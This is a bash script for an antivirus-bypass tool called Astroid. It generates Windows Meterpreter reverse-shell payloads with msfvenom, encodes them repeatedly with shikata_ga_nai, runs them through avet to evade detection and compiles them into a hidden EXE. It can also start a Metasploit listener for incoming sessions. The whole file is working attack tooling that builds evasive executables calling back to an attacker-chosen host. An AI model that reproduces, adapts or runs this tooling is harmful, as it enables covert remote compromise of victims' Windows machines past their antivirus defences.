#!/bin/bash
#
# Astroid A.V bypass tool . version 1.2
#
# Generate encoded shellcode with metasploit payloads,decoded by avet then compiled to EXE's
#
#                  Created By Mascerano Bachir .
#                 Website: http://www.dev-labs.co
#           YTB : https://www.youtube.com/c/mascerano%20bachir  
#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
#
# this is an open source tool if you want to modify or add something . Please give me a copy.

#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
#Define options
path=`pwd`
PAYLOAD=""
ENUMBER=""
txt="$RANDOM.txt"
txt1="$RANDOM.txt"
shellc="$path/$txt"
shellc1="$path/$txt1"
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit ..."
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using ASTROID  :)"
exit
}
clear
#banner head
echo -e $blue ""
echo "  █████╗ ███████╗████████╗██████╗  ██████╗ ██╗██████╗      "
echo " ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██║██╔══██╗     "
echo " ███████║███████╗   ██║   ██████╔╝██║   ██║██║██║  ██║     "
echo " ██╔══██║╚════██║   ██║   ██╔══██╗██║   ██║██║██║  ██║     "
echo " ██║  ██║███████║   ██║   ██║  ██║╚██████╔╝██║██████╔╝     "
echo " ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ v 1.2"
echo "           By Mascerano Bachir | [Dev-labs]                "
#Detect dependencies
checkdir="/root/.wine/"
if [ ! -d "$checkdir" ]; then
        echo
        echo -e $red "wine not found on this system."
        echo -e $green
        read -p "pess any key to run setup ..."
        chmod +x setup.sh
        sudo ./setup.sh
	exit
fi
checkbin="/usr/bin/mingw-gcc"
if [ ! -f "$checkbin" ]; then
        echo
        echo -e $red "[ X ] Mingw EXE not found on this system."
        echo -e $green
        read -p "pess any key to run setup ..."
        chmod +x setup.sh
        sudo ./setup.sh
	exit
fi
echo -e $yellow ""
read -p "enter an LHOST value: " lhst
read -p "enter an LPORT value: " lprt
clear
echo $bannr
echo -e $red " +-+-+-+-+-+-+-+-+ "
echo -e $red " |p|a|y|l|o|a|d|s| "
echo -e $red " +-+-+-+-+-+-+-+-+ "

echo ""
echo -e $yellow "LHOST set to $lhst and the LPORT is set to $lprt."
echo
function get_payload {
  echo "[+] payload options:"
  PS3='[?] Please select a valid payload option: '
  options=("meterpreter_reverse_tcp" "meterpreter_reverse_https" "meterpreter/reverse_tcp" "meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_winhttp" "meterpreter/reverse_winhttps")
  select opt in "${options[@]}"
  do
    case $opt in
      "meterpreter_reverse_tcp")
        PAYLOAD="windows/meterpreter_reverse_tcp"
        break
        ;;
      "meterpreter_reverse_https")
        PAYLOAD="windows/meterpreter_reverse_https"
        break
        ;;
      "meterpreter/reverse_tcp")
        PAYLOAD="windows/meterpreter/reverse_tcp"
        break
        ;;
      "meterpreter/reverse_http")
        PAYLOAD="windows/meterpreter/reverse_http"
        break
        ;;
      "meterpreter/reverse_https")
        PAYLOAD="windows/meterpreter/reverse_https"
        break
        ;;
      "meterpreter/reverse_winhttp")
        PAYLOAD="windows/meterpreter/reverse_winhttp"
        break
        ;;
      "meterpreter/reverse_winhttps")
        PAYLOAD="windows/meterpreter/reverse_winhttps"
        break
        ;;
      *)
        echo
        echo -e $red "[!] Invalid option selected"
        echo -e $yellow
        ;;
    esac
  done
}
get_payload
echo ""
function get_enumber {
  while true; do
    echo "[!] Example iterations (1 to 70)"
    read -p "[?] How many encoding iterations?: " enum
    if [ $enum ]; then
      if [[ "$enum" =~ ^[0-9]+$ ]] && [ "$enum" -ge 1 -a "$enum" -le 70 ]; then
        ENUMBER=$enum
      break
      fi
    fi
  done
}
get_enumber
clear
echo $bannr
echo -e $red "  _   _   _   _   _   _   _   _   "
echo -e $red " / \ / \ / \ / \ / \ / \ / \ / \  "
echo -e $red "( g | e | n | e | r | a | t | e ) "
echo -e $red " \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/  "

echo ""
echo -e $lightgreen "Using $lhst:$lprt"
echo -e $lightgreen "payload $PAYLOAD. with $ENUMBER iterations"
echo
directory="$path/output"
if [ ! -d "$directory" ]; then
	echo "Creating the output directory..."
	mkdir $directory
fi
if test "$(ls -A "$directory")"; then

	echo " Clean up output directory"
	rm $directory/*
fi
#generate shellcode
echo ""
echo -e $yellow "+++ Generating raw shellcode............ +++"
echo -e $green
for i in {0..12}; do
  if ! (($i % 10)); then
    printf "\e[1K\rprocessing"
  else
    printf "."
  fi
  sleep 1
done && printf "\e[2K\r"
msfvenom -p $PAYLOAD LHOST=$lhst LPORT=$lprt --platform windows -a x86 -e x86/shikata_ga_nai -i $ENUMBER -f c -o $shellc > /dev/null 2>&1
echo -e $lightcyan "Shellcode generated = $txt "
echo 
echo -e $yellow "+++ decoding the shellcode with avet.... +++" 
echo -e $green
for i in {0..12}; do
  if ! (($i % 10)); then
    printf "\e[1K\rprocessing"
  else
    printf "."
  fi
  sleep 1
done && printf "\e[2K\r"
sudo ./format.sh $shellc > /dev/null 2>&1 >> $shellc1  
sudo ./make_avet -f $shellc1 -F -E > /dev/null 2>&1
sleep 2
echo -e $lightcyan "decoded $txt to defs.h"
echo ""
echo -e $yellow "+++ Compiling to exe.................... +++"
echo -e $green
for i in {0..12}; do
  if ! (($i % 10)); then
    printf "\e[1K\rprocessing"
  else
    printf "."
  fi
  sleep 1
done && printf "\e[2K\r"
sudo mingw-gcc -o $path/output/astro.exe $path/avet.c -lws2_32 -mwindows > /dev/null 2>&1
sleep 2
echo ""
echo -e $lightcyan "--------------------------------------------------"
echo -e $lightcyan "[*] payload exec generated in output/astro.exe [*]"
echo -e $lightcyan "--------------------------------------------------"
# cleanup
rm $shellc
rm $shellc1
rm defs.h
echo -e $yellow "" 
while true; do
    read -p "[*] Would you like to start a listener? (Y/n) = " yn
    case $yn in
    [Yy]* ) service postgresql start;xterm -T "ASTROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhst; set LPORT $lprt; set PAYLOAD $PAYLOAD; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z'";echo "";echo "stopping postgresql service";service postgresql stop;sleep 2;echo "";echo "Good Bye!";echo "";exit;;
    [Nn]* ) echo "";echo "Good Bye!";echo "";exit;;
    esac
done
